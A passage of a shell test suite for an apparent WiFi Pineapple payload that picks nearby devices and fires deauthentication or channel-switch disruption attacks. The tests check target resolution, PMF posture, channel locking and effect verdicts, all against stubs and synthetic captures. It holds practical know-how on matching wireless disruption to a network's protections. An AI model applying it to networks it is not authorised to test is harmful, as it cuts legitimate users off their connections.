  iw() {   # two phys sharing 2.4 GHz that disagree on ch 6: phy0 (the transmitter here) says No IR, phy1 does not
    [ "$1" = phy ] && [ "$3" = channels ] || return 1
    printf 'Band 1:\n\t* 2437 MHz [6] \n'; [ "$2" = phy0 ] && printf '\t  No IR\n'
    printf '\t* 2412 MHz [1] \n'; [ "$2" = phy1 ] && printf 'Band 2:\n\t* 5180 MHz [36] \n'; return 0
  }
  INJ_SYSFS="$tmp/sys/phy"; NET_SYSFS="$tmp/sys/net"; RECON_IF=wlan9mon
  printf 'phy0\n' >"$tmp/sys/net/wlan9mon/phy80211/name"
  inj_probe force; st "inj probe: tx phy resolved from sysfs"                "$?/$INJ_TXPHY" "0/phy0"
  st "inj probe: resolved mode follows the tx phy (ch6 No IR there)" "${INJ_OK[2/6]}"        "0"
  st "inj probe: resolved mode reads only the tx phy"                 "${INJ_OK[5/36]:-unset}" "unset"
  rm -f "$tmp/sys/net/wlan9mon/phy80211/name"
  inj_probe force; st "inj probe: unresolved tx phy falls back to the merge" "$?/$INJ_TXPHY" "0/"
  st "inj probe: merge is last-phy-wins on a shared channel"          "${INJ_OK[2/6]}"        "1"
  st "inj probe: merge carries the other phy's band"                  "${INJ_OK[5/36]}"       "1"
  st "inj probe: fallback merge is logged with the phy count"         "$(grep -c 'tx phy unresolved .* merged 2 phys' "$tmp/events.log")" "1"
  unset -f iw
  INJ_PROBED=$_ip2; INJ_PROBE_TS=$_its; INJ_TXPHY=$_itx; INJ_SYSFS=$_isys; NET_SYSFS=$_nsys; RECON_IF=$_rif
  INJ_OK=(); for k in "${!_iok2[@]}"; do INJ_OK[$k]=${_iok2[$k]}; done
  # three operator-selectable attacks: command mapping, viability, honest per-option labels
  st "cmd DEAUTH"  "$(response_cmd DEAUTH)" "PINEAPPLE_DEAUTH_CLIENT"
  st "cmd CSA"     "$(response_cmd CSA)"    "PINEAPPLE_DEAUTH_CLIENT_CSA"
  # BOTH maps to the opcode-400 deauth; resp_fire adds the CSA as a second command. _ALL is NOT
  # used: it carries the CSA command id and builds no deauth frame (CLAUDE.md "Third contact").
  st "cmd BOTH is the deauth, not _ALL" "$(response_cmd BOTH)" "PINEAPPLE_DEAUTH_CLIENT"
  # ---- CSA injector routing ----------------------------------------------------------------
  # csa_newchan must never announce the channel the target is already on: that announces no move,
  # the kernel discards it before reading the count under mode 0, and pagerinj refuses it outright.
  R_BAND=2; R_CH=8;   CSA_CHAN=0; st "csa chan: 2.4 high picks 1"      "$(csa_newchan)" "1"
  R_BAND=2; R_CH=3;   CSA_CHAN=0; st "csa chan: 2.4 low picks 11"      "$(csa_newchan)" "11"
  R_BAND=5; R_CH=36;  CSA_CHAN=0; st "csa chan: 5 GHz avoids its own"  "$(csa_newchan)" "40"
  R_BAND=5; R_CH=149; CSA_CHAN=0; st "csa chan: 5 GHz default"         "$(csa_newchan)" "36"
  R_BAND='?'; R_CH=8; CSA_CHAN=0; st "csa chan: unknown band will not guess" "$(csa_newchan)" ""
  R_BAND=2; R_CH=8;   CSA_CHAN=6; st "csa chan: explicit override wins" "$(csa_newchan)" "6"
  CSA_CHAN=0
  # Routing, and the rc-vs-stderr asymmetry that makes it worth testing: pagerinj prints its
  # sent=/failed= summary to stderr even when it succeeds, so stderr cannot mean failure for it,
  # while hak5cmd exits 0 on every error path so rc cannot mean success for that. A single rule
  # would file a fabricated result for one of the two senders.
  R_BSSID=aa:00:00:00:00:10; R_CH=8; R_BAND=2; RECON_IF=wlan1mon; CSA_COUNT=3
  printf '#!/bin/sh\nprintf "sent=30 failed=0\\n" >&2\nprintf "%%s\\n" "$*" >"%s/injargs"\nexit 0\n' "$tmp" >"$tmp/inj_ok"
  printf '#!/bin/sh\nprintf "no beacon captured\\n" >&2\nexit 1\n' >"$tmp/inj_bad"
  chmod +x "$tmp/inj_ok" "$tmp/inj_bad"
  CSA_INJECTOR="$tmp/inj_ok"; csa_issue
  st "csa issue: a working injector succeeds despite writing to stderr" "$?" 0
  st "csa issue: it was called with iface, bssid, a DIFFERENT channel and the count" \
    "$(grep -c -- '\-i wlan1mon --csa --bssid aa:00:00:00:00:10 --chan 1 --count 3' "$tmp/injargs")" "1"
  st "csa issue: the loot names the injector and its parameters" "$CSA_CMD" "inj_ok:ch1:n3"
  CSA_INJECTOR="$tmp/inj_bad"; csa_issue
  st "csa issue: a non-zero injector rc is a failure"            "$?" 1
  st "csa issue: and the reason is carried to the caller" \
    "$(printf '%s' "$CSA_ERR" | grep -c 'no beacon captured')" "1"
  # A CAPPED injector transmitted and was then killed by its own timeout, so rc is timeout's (124)
  # and not pagerinj's. Scoring that as a refusal writes CMD_REFUSED -- "nothing was transmitted" --
  # for frames that provably left the radio, which the harness calls a lie in as many words. rc 2 is
  # the third state. Falsified by: csa_issue returning 1 for a run whose stderr reports sent=N, N>0.
  printf '#!/bin/sh\nprintf "interrupted: sent=90 failed=0\\n" >&2\nexit 124\n' >"$tmp/inj_capped"
  printf '#!/bin/sh\nprintf "interrupted: sent=5 failed=0\\n" >&2\nexit 7\n' >"$tmp/inj_sent7"
  chmod +x "$tmp/inj_capped" "$tmp/inj_sent7"
  # -k is a syntax dependency this payload cannot verify against the Pager's busybox, so csa_issue
  # has to fall back rather than fail. Stub a timeout that rejects -k the way an older build would.
  timeout() { case "$1" in -k) return 1 ;; esac; shift; "$@"; }
  TIMEOUT_K_PROBED=0; TIMEOUT_K=()
  CSA_INJECTOR="$tmp/inj_ok"; csa_issue
  st "csa issue: a timeout that rejects -k still runs the injector" "$?" 0
  st "csa issue: and it ran with no -k in the argv"  "$(grep -c -- '-k' "$tmp/injargs")" "0"
  unset -f timeout; TIMEOUT_K_PROBED=0; TIMEOUT_K=()
  CSA_INJECTOR="$tmp/inj_capped"; csa_issue >/dev/null 2>&1
  st "csa issue: a capped injector is rc 2 (sent, then killed), not a refusal" "$?" 2
  st "csa issue: and the reason says it transmitted first" \
    "$(printf '%s' "$CSA_ERR" | grep -c 'capped after transmitting')" "1"
  CSA_INJECTOR="$tmp/inj_sent7"; csa_issue >/dev/null 2>&1
  st "csa issue: any rc whose stderr reports sent=N>0 is rc 2, not a refusal" "$?" 2
  CSA_INJECTOR="$tmp/not_installed"; csa_issue >/dev/null 2>&1
  st "csa issue: an absent injector falls back to the firmware command" "$CSA_CMD" "PINEAPPLE_DEAUTH_CLIENT_CSA"
  st "csa issue: a successful injector leaves no error behind" \
    "$( CSA_INJECTOR="$tmp/inj_ok"; csa_issue && printf '[%s]' "$CSA_ERR" )" "[]"
  # The two senders answer the rc-vs-stderr question OPPOSITELY and csa_issue has to get both right.
  # hak5cmd exits 0 on EVERY path including its error paths and writes the reason to stderr
  # (measured 2026-11-05), so for the firmware command stderr is the only signal and rc is worthless.
  # pagerinj is the reverse: it prints its sent=/failed= summary to stderr ON SUCCESS, so rc is the
  # only signal -- which the inj_ok case above covers. Nothing exercised the firmware half, so the
  # `[ -z "$err" ]` guard could have been dropped in a refactor with every test still green.
  # Falsified by: csa_issue returning 0 for a command that printed to stderr, on either sender.
  PINEAPPLE_DEAUTH_CLIENT_CSA() { printf 'close - IO is pending on closed socket\n' >&2; return 0; }
  CSA_INJECTOR=""; csa_issue >/dev/null 2>&1
  st "csa issue: the firmware shape -- rc 0 WITH stderr -- is a failure, not a send" "$?" 1
  st "csa issue: and that stderr reaches the caller as the reason" \
    "$(printf '%s' "$CSA_ERR" | grep -c 'IO is pending')" "1"
  PINEAPPLE_DEAUTH_CLIENT_CSA() { return 0; }
  CSA_INJECTOR=""; csa_issue >/dev/null 2>&1
  st "csa issue: rc 0 with a silent firmware command is a send"  "$?" 0
  # The picker label must follow the sender. With an injector configured, "fw-broken" is a lie.
  CSA_INJECTOR="$tmp/inj_ok"
  st "expect: with an injector, CSA is not fw-broken"  "$(posture_expect 'D+C' CSA)"  "injector"
  st "expect: with an injector, BOTH names both legs"  "$(posture_expect 'D+C' BOTH)" "deauth+csa"
  st "expect: an injector does not override NOINJ"     "$(posture_expect NOINJ CSA)"  "blocked"
  st "expect: nor beacon protection"                   "$(posture_expect NONE BOTH)"  "blocked"
  CSA_INJECTOR="$tmp/not_installed"
  st "expect: a configured but absent injector is still fw-broken" "$(posture_expect 'D+C' CSA)" "fw-broken"
  CSA_INJECTOR=""
  st "cmd unknown is empty" "$(response_cmd WAT)" ""
  st "opts no PMF leads DEAUTH"    "$(posture_opts 'D+C')" "DEAUTH BOTH CSA"
  st "opts PMF required leads DEAUTH" "$(posture_opts C)"  "DEAUTH BOTH CSA"
  st "opts beacon prot offers none" "$(posture_opts NONE)" ""
  st "opts no-inject offers none"  "$(posture_opts NOINJ)" ""
  st "opts unread leads DEAUTH"    "$(posture_opts '?')"   "DEAUTH BOTH CSA"

  # The shipped default is recon+response. A silent revert to 0 would disarm the rung with no
  # other symptom, so pin it here rather than trusting the config block to stay put.
  st "RESPONSE ships on"           "$RESPONSE"             "1"
  st "RESPONSE_CONFIRM ships on"   "$RESPONSE_CONFIRM"     "1"
  st "AUTO_RESPOND ships off"      "$AUTO_RESPOND"         "0"

  # attack_scope: only DEAUTH on a client row is targeted; everything else is the whole BSS.
  R_TARGET=aa:00:00:00:00:11
  st "scope DEAUTH on a client"    "$(attack_scope DEAUTH)" "cli"
  st "scope CSA is bss-wide"       "$(attack_scope CSA)"    "bss"
  st "scope BOTH is bss-wide"      "$(attack_scope BOTH)"   "bss"
  R_TARGET=ff:ff:ff:ff:ff:ff
  st "scope DEAUTH on an AP row"   "$(attack_scope DEAUTH)" "bss"
  R_TARGET=
  st "expect deauth vs no PMF"     "$(posture_expect 'D+C' DEAUTH)"  "works"
  st "expect deauth vs optional PMF" "$(posture_expect 'D?+C' DEAUTH)" "partial"
  st "expect deauth vs required PMF" "$(posture_expect C DEAUTH)"    "blocked"
  # CSA and BOTH cannot transmit on 1.1.3 at all (pineapd throws on a missing 'sta' before the
  # opcode dispatch), so the badge never speaks for them -- except where the radio or the crypto
  # rules them out first, which stays the stronger answer.
  st "expect csa is fw-broken"     "$(posture_expect C CSA)"         "fw-broken"
  # BOTH is the opcode-400 deauth plus a CSA leg that cannot land, so the badge governs the half
  # that can; only CSA-alone is flatly fw-broken.
  st "expect both is deauth only"  "$(posture_expect 'D+C' BOTH)"    "deauth only"
  st "expect both vs required PMF" "$(posture_expect C BOTH)"        "blocked"
  st "expect csa on NOINJ is still blocked" "$(posture_expect NOINJ BOTH)" "blocked"
  st "expect csa vs beacon prot"   "$(posture_expect NONE CSA)"      "blocked"
  st "expect both vs beacon prot"  "$(posture_expect NONE BOTH)"     "blocked"
  st "expect anything on NOINJ"    "$(posture_expect NOINJ CSA)"     "blocked"
  st "expect anything when unread" "$(posture_expect '?' DEAUTH)"    "unknown"
  # 7c beacon element parsing (synthetic frames; no radio needed)
  local RSN_PMF='0100000fac040100000fac040100000fac08cc00'   # 1 pairwise, 1 AKM, caps 0x00cc
  local RSN_NOP='0100000fac040100000fac040100000fac020c00'   # same shape, caps 0x000c
  st "ie_find first element"    "$(ie_find 0003616263 0 0)"              "616263"
  st "ie_find later element"    "$(ie_find 0003616263dd0411223344 0 221)" "11223344"
  ie_find 0003616263 0 48 >/dev/null 2>&1; st "ie_find absent element rc" "$?" 1
  ie_find 000a6162 0 0 >/dev/null 2>&1;    st "ie_find truncated chain rc" "$?" 1
  st "rsn_caps walks suite lists" "$(rsn_caps "$RSN_PMF")" "cc00"
  rsn_caps 0100000f >/dev/null 2>&1; st "rsn_caps short element rc" "$?" 1
  st_beacon_pcap "$tmp/b_open.pcap" aabbccddeeff "" ""
  st "beacon: open network"       "$(posture_read_pcap "$tmp/b_open.pcap" 2 6)" "D+C"
  st_beacon_pcap "$tmp/b_np.pcap" aabbccddeeff "$RSN_NOP" "$XNO"
  st "beacon: WPA2 without PMF"   "$(posture_read_pcap "$tmp/b_np.pcap" 2 6)"   "D+C"
  st_beacon_pcap "$tmp/b_pmf.pcap" aabbccddeeff "$RSN_PMF" ""
  st "beacon: PMF required"       "$(posture_read_pcap "$tmp/b_pmf.pcap" 2 6)"  "C"
  # POSTURE_RSN/POSTURE_EXT only reach the caller when not run in a subshell, so re-run in-shell
  posture_read_pcap "$tmp/b_pmf.pcap" 2 6 >/dev/null
  st "beacon: rsn caps extracted" "$POSTURE_RSN"                                "cc00"
  st "beacon: absent extcap stays -" "$POSTURE_EXT"                             "-"
  st_beacon_pcap "$tmp/b_bp.pcap" aabbccddeeff "$RSN_PMF" "$XBP"
  st "beacon: PMF + beacon prot"  "$(posture_read_pcap "$tmp/b_bp.pcap" 2 6)"   "NONE"
  st "beacon: DFS beats posture"  "$(posture_read_pcap "$tmp/b_pmf.pcap" 5 52)" "NOINJ"
  st "beacon: UNII-1 reads normally" "$(posture_read_pcap "$tmp/b_pmf.pcap" 5 36)" "C"
  printf 'garbage' >"$tmp/b_bad.pcap"; beacon_find "$tmp/b_bad.pcap" >/dev/null 2>&1
  st "beacon: bad magic rejected" "$?" 1
  st_pcap "$tmp/b_data.pcap" 1200 4 1700000000; beacon_find "$tmp/b_data.pcap" >/dev/null 2>&1
  st "beacon: no beacon in file rc" "$?" 1
  # 7d response rung: target resolution, effect verdicts, loot row
  st_device aa:00:00:00:00:10 ap "Reolink" "cam-ap" 0 -
  CH[aa:00:00:00:00:10]=6; BAND[aa:00:00:00:00:10]=2
  resp_target aa:00:00:00:00:10
  st "resp_target ap targets broadcast" "$R_TARGET" "ff:ff:ff:ff:ff:ff"
  st "resp_target ap is its own bssid"  "$R_BSSID"  "aa:00:00:00:00:10"
  st "resp_target ap channel"           "$R_CH"     "6"
  st_device aa:00:00:00:00:11 cli "Wyze" "" 0 aa:00:00:00:00:10
  CH[aa:00:00:00:00:11]=0
  resp_target aa:00:00:00:00:11
  st "resp_target cli uses ap bssid"    "$R_BSSID"  "aa:00:00:00:00:10"
  st "resp_target cli targets itself"   "$R_TARGET" "aa:00:00:00:00:11"
  st "resp_target cli rides ap channel" "$R_CH"     "6"
  st_device aa:00:00:00:00:12 cli "Espressif" "" 0 -
  resp_target aa:00:00:00:00:12 >/dev/null 2>&1; st "resp_target unassociated rc" "$?" 1
  st_device aa:00:00:00:00:13 ap "Hikvision" "x" 0 -
  CH[aa:00:00:00:00:13]=0
  resp_target aa:00:00:00:00:13 >/dev/null 2>&1; st "resp_target no channel rc" "$?" 1
  st "verdict target vanished"  "$(resp_verdict 100 50 - - 0)"     "MOVED"
  st "verdict counter advanced" "$(resp_verdict 100 50 140 60 1)"  "NO_EFFECT"
  st "verdict counter stalled"  "$(resp_verdict 100 50 100 50 1)"  "MOVED"
  st "verdict stalled but seen" "$(resp_verdict 100 50 100 60 1)"  "INCONCLUSIVE"
  st "verdict no baseline"      "$(resp_verdict - - 140 60 1)"     "INCONCLUSIVE"
  # A subject Recon never listed: absent before AND after. Judging presence before the baseline
  # scored this MOVED and showed a green hit for a device that was never measured.
  st "verdict never measured"   "$(resp_verdict - - - - 0)"        "INCONCLUSIVE"
  st "verdict absent, no baseline, seen after" "$(resp_verdict - - 10 20 1)" "INCONCLUSIVE"
  st "verdict no follow-up"     "$(resp_verdict 100 50 - - 1)"     "INCONCLUSIVE"
  st "verdict non-numeric"      "$(resp_verdict x 50 y 60 1)"      "INCONCLUSIVE"
  # child_del on a file whose only line IS the pid: grep -v -x selects nothing and exits 1, so the
  # old `&& mv` never ran and the pid stayed registered. kill_children then SIGTERMed and SIGKILLed
  # a pid the kernel may have recycled, on a device whose neighbours are pineapd and the Go UI.
  st_cf="$CHILD_FILE"; CHILD_FILE="$tmp/children"
  printf '4242\n' >"$CHILD_FILE"; child_del 4242
  st "child_del: removes the pid when it is the file's only line" "$(cat "$CHILD_FILE")" ""
  printf '4242\n999\n' >"$CHILD_FILE"; child_del 4242
  st "child_del: and still removes one of several"                "$(cat "$CHILD_FILE")" "999"
  CHILD_FILE="$st_cf"
  POSTURE[aa:00:00:00:00:10]=C; POSTURE_TS[aa:00:00:00:00:10]=$EPOCHSECONDS
  # cur_channel must not depend on iwinfo alone: it is a declared dependency that the measured
  # device inventory does not list, and without the iw fallback lock_target failed OPEN and wrote
  # lock=ok for a lock it never verified.
  iwinfo() { :; }; iw() { echo 'channel 52 (5260 MHz), width: 20 MHz'; }
  st "cur_channel: falls back to iw when iwinfo says nothing" "$(cur_channel)" "52"
  iwinfo() { echo "          Channel: 11 (2.462 GHz)"; }
  st "cur_channel: prefers iwinfo when it answers"            "$(cur_channel)" "11"
  iwinfo() { :; }; iw() { :; }
  PINEAPPLE_EXAMINE_BSSID() { :; }; PINEAPPLE_EXAMINE_CHANNEL() { :; }
  lock_target aa:00:00:00:00:10 5 6 >/dev/null
  st "lock_target: no read-back is rc 3, not a verified lock"  "$?" 3
  st "lock_target: and it says the lock is unverified" "$(printf '%s' "$LOCK_TEXT" | grep -c unverified)" "1"
  # A transient unreadable sample is not a different channel. Measured on the bench 2026-11-09:
  # cur_channel returned empty, then 1, then 1, against a target channel of 1 -- the radio WAS
  # parked where it was asked to be -- and the all-three-equal test scored that "still hopping
  # (/1/1)", returned 2 and refused the whole response (loot row LOCK_FAILED on 50:92:6a:ae:a8:82).
  # The counter lives in a file because cur_channel runs iwinfo inside $( ), so a variable
  # incremented in the stub would die with the subshell and every sample would read the same.
  : >"$tmp/chseq"
  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" -gt 1 ] && printf '          Channel: 1 (2.412 GHz)\n'; return 0; }
  lock_target aa:00:00:00:00:10 5 1 >/dev/null
  st "lock_target: an empty first sample is not 'still hopping'" "$?" 0
  # MIDDLE sample unreadable. This is the one empty pattern that behaves identically under either
  # backfill order, so the mutation test has no teeth on it -- which is exactly why it needs a case
  # of its own. CLAUDE.md claimed this was covered before 2026-11-10; it was not.
  : >"$tmp/chseq"
  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" != 2 ] && printf '          Channel: 1 (2.412 GHz)\n'; return 0; }
  lock_target aa:00:00:00:00:10 5 1 >/dev/null
  st "lock_target: a MIDDLE empty sample is not 'still hopping'" "$?" 0
  # TWO unreadable samples leave exactly ONE reading, and one reading cannot establish that the
  # radio is parked: the backfill turns the comparison into c3 = c3 = c3, a tautology. This used to
  # return 0 and write lock=ok -- more confidence from less evidence than the two-good-samples case
  # four lines up, which returns 3. rc 3 proceeds, so the 2026-11-09 fix is intact; only the label
  # is honest now. Falsified by: this returning 0, or returning 2 (a refusal, the original bug).
  : >"$tmp/chseq"
  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" -gt 2 ] && printf '          Channel: 1 (2.412 GHz)\n'; return 0; }
  lock_target aa:00:00:00:00:10 5 1 >/dev/null
  st "lock_target: ONE readable sample is unverified, not a verified lock" "$?" 3
  st "lock_target: and it is still not scored as hopping" \
    "$(printf '%s' "$LOCK_TEXT" | grep -c 'hopping')" "0"
  # The FOURTH read-back, after EXAMINE_CHANNEL. Protected by neither the 2026-11-09 nor the
  # 2026-11-10 repair: a transient empty here scored "ch  != 1, lock failed" -- rc 2, refusing the
  # whole response and transmitting nothing, with the same empty-field signature as the original bug.
  : >"$tmp/chseq"
  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" -lt 4 ] && printf '          Channel: 6 (2.437 GHz)\n'; return 0; }
  lock_target aa:00:00:00:00:10 5 1 >/dev/null
  st "lock_target: an empty FOURTH read is unverified, not a failed lock" "$?" 3
  # The hopping log line must show the RAW samples. The 2026-11-09 defect was found only because
  # "(/1/1)" made the empty slot visible; printing the backfilled values hid it and reported a
  # sample that was never read.
  : >"$tmp/chseq"
  iwinfo() { printf 'x' >>"$tmp/chseq"; case "$(wc -c <"$tmp/chseq" | tr -d ' ')" in 2) printf '          Channel: 6 (2.437 GHz)\n' ;; 3) printf '          Channel: 11 (2.462 GHz)\n' ;; esac; return 0; }
  lock_target aa:00:00:00:00:10 5 1 >/dev/null
  st "lock_target: a genuinely hopping radio is still a failed lock" "$?" 2
  st "lock_target: and the log shows the unread sample as _, not a backfilled value" \
    "$(printf '%s' "$LOCK_TEXT" | grep -c '_/6/11')" "1"
  : >"$tmp/chseq"
  iwinfo() { printf 'x' >>"$tmp/chseq"; printf '          Channel: %s (2.412 GHz)\n' "$(wc -c <"$tmp/chseq" | tr -d ' ')"; }
  lock_target aa:00:00:00:00:10 5 1 >/dev/null
  st "lock_target: samples that really differ are still a failed lock" "$?" 2
  iwinfo() { :; }
  unset -f iwinfo iw; PINEAPPLE_EXAMINE_BSSID() { :; }; PINEAPPLE_EXAMINE_CHANNEL() { :; }   # restore the base stubs; unsetting them would expose the real ones
  st "disrupt row shows cached badge" "$(disrupt_row aa:00:00:00:00:10)" "Disrupt [C]"
  # :13 is the CH=0 fixture the line above asserts resp_target refuses. It used to render a plain
  # inviting "Disrupt" that dead-ends: the refusal is logged to the pane BEHIND the card, so the
  # card redraws unchanged and the button looks broken. The row now says which reason applies.
  st "disrupt row says no channel, not a dead Disrupt" "$(disrupt_row aa:00:00:00:00:13)" "Disrupt n/a (no channel)"
  st_device aa:00:00:00:00:14 cli "Wyze Labs Inc" "" 0 -; CH[aa:00:00:00:00:14]=6; BAND[aa:00:00:00:00:14]=2
  st "disrupt row says not associated on an unassociated client" "$(disrupt_row aa:00:00:00:00:14)" "Disrupt n/a (not associated)"
  R_BSSID=aa:00:00:00:00:10; R_TARGET=ff:ff:ff:ff:ff:ff; R_CH=6; R_BAND=2
  POSTURE_RSN=cc00; POSTURE_EXT=-; rm -f "$tmp/responses.tsv"
  resp_write aa:00:00:00:00:10 C CSA PINEAPPLE_DEAUTH_CLIENT_CSA ok 10 10 MOVED
  st "response header written"           "$(head -1 "$tmp/responses.tsv")" "$RESP_HDR"
  st "response row field count = header" "$(sed -n 2p "$tmp/responses.tsv" | awk -F'|' '{print NF}')" \
                                         "$(printf '%s\n' "$RESP_HDR" | awk -F'|' '{print NF}')"
  st "posture_why covers NOINJ" "$(posture_why NOINJ | grep -c 'may not transmit')" "1"
  RESPONSE=0; AUTO_RESPOND=0
  auto_respond_ok aa:00:00:00:00:10 2>/dev/null; st "auto_respond off by default"     "$?" 1
  RESPONSE=1
  auto_respond_ok aa:00:00:00:00:10 2>/dev/null; st "auto_respond needs its own key"  "$?" 1
  AUTO_RESPOND=1
  auto_respond_ok aa:00:00:00:00:10 2>/dev/null; st "auto_respond with both keys"     "$?" 0
  IGNORED[aa:00:00:00:00:10]=1
  auto_respond_ok aa:00:00:00:00:10 2>/dev/null; st "auto_respond skips ignored"      "$?" 1
  unset "IGNORED[aa:00:00:00:00:10]"
  auto_respond_ok aa:00:00:00:00:12 2>/dev/null; st "auto_respond skips unattackable" "$?" 1
  RESPONSE=0; AUTO_RESPOND=0
  st "aggregate: all quiet"          "$(resp_aggregate 2 0 0)" "MOVED"
  st "aggregate: any still active"   "$(resp_aggregate 1 1 0)" "NO_EFFECT"
  st "aggregate: mixed"              "$(resp_aggregate 1 0 1)" "INCONCLUSIVE"
  st "aggregate: nothing measured"   "$(resp_aggregate 0 0 0)" "INCONCLUSIVE"
  # CMD_REFUSED is deliberately outside the measurement vocabulary: a command the firmware refused
  # transmitted nothing, so it must never be summarised as MOVED or NO_EFFECT. resp_aggregate only
  # ever counts measured subjects, so it can never produce it -- pin that.
  st "aggregate: never invents CMD_REFUSED" "$(resp_aggregate 1 1 1 | grep -c CMD_REFUSED)" "0"
  rm -f "$tmp/responses.tsv"; resp_write aa:00:00:00:00:10 C CSA PINEAPPLE_DEAUTH_CLIENT_CSA ok 10 - CMD_REFUSED
  st "response row: a refusal is recorded as CMD_REFUSED" "$(sed -n 2p "$tmp/responses.tsv" | awk -F'|' '{print $NF}')" "CMD_REFUSED"
  rm -f "$tmp/responses.tsv"; resp_write aa:00:00:00:00:10 C CSA PINEAPPLE_DEAUTH_CLIENT_CSA ok 10 10 MOVED aa:00:00:00:00:11
  st "response row: measured target override" "$(sed -n 2p "$tmp/responses.tsv" | cut -d'|' -f5)" "aa:00:00:00:00:11"
  # resp_snapshot picks subjects by the attack's scope, not by the picked row. A client-row CSA/BOTH
  # transmits BSS-wide, so it must measure the BSS, or the verdict and the loot under-report what was
  # actually hit. Note is_rand keys on the MAC's second character, so these fixtures use ec:71:db
  # (not the aa: ones above, which read as randomised) wherever a client must survive the bss sweep.
  # The stub logs each call, because the one thing the in-sweep target guard buys over the
  # recon_stat fallback below it is staying within a single Recon read.
  local orig_recon; orig_recon=$(declare -f recon_lines)
  recon_lines() {   # mac|ap_mac|packets|signal|probes|freq|time|channel
    printf 'x\n' >>"$tmp/recon_calls"
    printf '%s\n' \
      'ec:71:db:00:00:11|ec:71:db:00:00:10|100|-50|-|2437|1700000000|6' \
      'ec:71:db:00:00:12|ec:71:db:00:00:10|200|-60|-|2437|1700000000|6' \
      'ec:71:db:00:00:13|ec:71:db:00:00:99|300|-70|-|2437|1700000000|6' \
      'a2:71:db:00:00:14|ec:71:db:00:00:10|400|-65|-|2437|1700000000|6'
  }
  R_BSSID=ec:71:db:00:00:10; R_CH=6; R_BAND=2
  R_TARGET=ff:ff:ff:ff:ff:ff; resp_snapshot bss
  st "snapshot bss: own BSS, no randoms" "$(st_subjects)" "ec:71:db:00:00:11 ec:71:db:00:00:12"
  R_TARGET=ec:71:db:00:00:11; resp_snapshot cli
  st "snapshot cli: the one target"      "$(st_subjects)" "ec:71:db:00:00:11"
  R_TARGET=ec:71:db:00:00:11; resp_snapshot bss
  st "snapshot bss from a client row"    "$(st_subjects)" "ec:71:db:00:00:11 ec:71:db:00:00:12"
  R_TARGET=ec:71:db:00:00:13; resp_snapshot cli
  st "snapshot cli ignores the BSSID"    "$(st_subjects)" "ec:71:db:00:00:13"
  rm -f "$tmp/recon_calls"; R_TARGET=a2:71:db:00:00:14; resp_snapshot bss
  st "snapshot bss keeps a random pick"  "$(st_subjects)" "a2:71:db:00:00:14 ec:71:db:00:00:11 ec:71:db:00:00:12"
  st "snapshot bss stays at one read"    "$(wc -l <"$tmp/recon_calls" | tr -d ' ')" "1"
  # A pick whose row is not under R_BSSID (the shape real firmware yields: ap_mac '-') is still a subject,
  # via the recon_stat fallback: one extra read, the sweep's two clients plus the pick with its own counter.
  rm -f "$tmp/recon_calls"; R_TARGET=ec:71:db:00:00:13; resp_snapshot bss
  st "snapshot bss: a pick outside the sweep is added by recon_stat" "$(st_subjects)" "ec:71:db:00:00:11 ec:71:db:00:00:12 ec:71:db:00:00:13"
  st "snapshot bss: the added pick carries its own counter"       "${RS_PK[ec:71:db:00:00:13]}" "300"
  st "snapshot bss: the fallback costs exactly one more read"     "$(wc -l <"$tmp/recon_calls" | tr -d ' ')" "2"
  rm -f "$tmp/recon_calls"
  # 7k membership from the air (bss_clients). No shipped firmware supplies a client->AP
  # association, so for a BSS-wide attack the subject set is read off a capture instead. These
  # cases are the walker's whole contract: which address is the client depends on frame direction,
  # and getting that wrong enters the AP as its own client (RESPONSE.md 13a-i).
  local BSSH=ec71db000010 BSSC=ec:71:db:00:00:10
  st_data_pcap "$tmp/mem.pcap" "$BSSH"
  st "bss_clients: ToDS addr2 and FromDS addr1, nothing else" "$(st_members "$tmp/mem.pcap" "$BSSC")" \
     "ec:71:db:00:00:11 ec:71:db:00:00:12 ec:71:db:00:00:14"
  st "bss_clients: radiotap it_len reported"      "$(st_bss_key "$tmp/mem.pcap" "$BSSC" ITMAX)" "18"
  st "bss_clients: every record walked"           "$(st_bss_key "$tmp/mem.pcap" "$BSSC" RECS)"  "15"
  st "bss_clients: a short frame is a runt, not a truncation" "$(st_bss_key "$tmp/mem.pcap" "$BSSC" TRUNC)" "0"
  st "bss_clients: the runt is counted as one"    "$(st_bss_key "$tmp/mem.pcap" "$BSSC" RUNT)"  "1"
  # A big-endian pcap whose radiotap it_len is still little-endian. Reading it_len with the pcap's
  # byte order would give 18 -> 4608 here, every record would fail the rt+16 guard, and the member
  # set would be empty. This is the only case that distinguishes le16 from u16.
  st_data_pcap "$tmp/mem_be.pcap" "$BSSH" be
  st "bss_clients: big-endian pcap, little-endian radiotap" "$(st_members "$tmp/mem_be.pcap" "$BSSC")" \
     "ec:71:db:00:00:11 ec:71:db:00:00:12 ec:71:db:00:00:14"
  st "bss_clients: big-endian record lengths parsed"        "$(st_bss_key "$tmp/mem_be.pcap" "$BSSC" RECS)" "15"
  st "bss_clients: the runt is counted, not fatal" "$(st_bss_key "$tmp/mem.pcap" "$BSSC" SHORT)" "1"
  st "bss_clients: an upper-case BSSID still matches" "$(st_members "$tmp/mem.pcap" EC:71:DB:00:00:10)" \
     "ec:71:db:00:00:11 ec:71:db:00:00:12 ec:71:db:00:00:14"
  st "bss_clients: another BSSID sees none"        "$(st_members "$tmp/mem.pcap" aa:00:00:00:00:99)" ""
  OWN_MACS=" ec:71:db:00:00:11 "
  st "bss_clients: our own MAC is never a client" "$(st_members "$tmp/mem.pcap" "$BSSC")" \
     "ec:71:db:00:00:12 ec:71:db:00:00:14"
  OWN_MACS=" "
  printf 'not a pcap at all' >"$tmp/mem_bad.pcap"
  bss_clients "$tmp/mem_bad.pcap" "$BSSC" >/dev/null 2>&1; st "bss_clients: not a pcap rc"  "$?" 1
  : >"$tmp/mem_empty.pcap"
  bss_clients "$tmp/mem_empty.pcap" "$BSSC" >/dev/null 2>&1; st "bss_clients: empty file rc" "$?" 1
  # A header and nothing else is what tcpdump leaves when it armed and heard nobody. That has to
  # read as rc 0 with no records, because resp_members reports it as NO_CLIENTS -- a different
  # answer from NO_CAPTURE, and the whole point of splitting the refusal tokens.
